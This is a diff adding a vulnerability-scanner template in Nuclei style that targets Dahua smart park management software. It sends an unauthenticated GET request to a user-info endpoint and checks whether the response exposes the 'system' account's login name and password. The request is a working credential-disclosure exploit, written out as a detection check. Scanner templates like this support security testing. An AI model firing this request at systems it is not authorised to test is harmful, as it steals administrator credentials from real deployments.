@@ -1,0 +1,26 @@
+id: dahua-loginpass-reader
+
+info:
+  name: dahua-loginpass-reader
+  author: user
+  severity: high
+  description: 大华智慧园区任意密码读取攻击
+  reference:
+    - 
+  tags: dahua
+
+requests:
+  - method: GET
+    path: 
+      - "{{BaseURL}}/admin/user_getUserInfoByUserName.action?userName=system"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - '"loginName":"system","loginPass"'
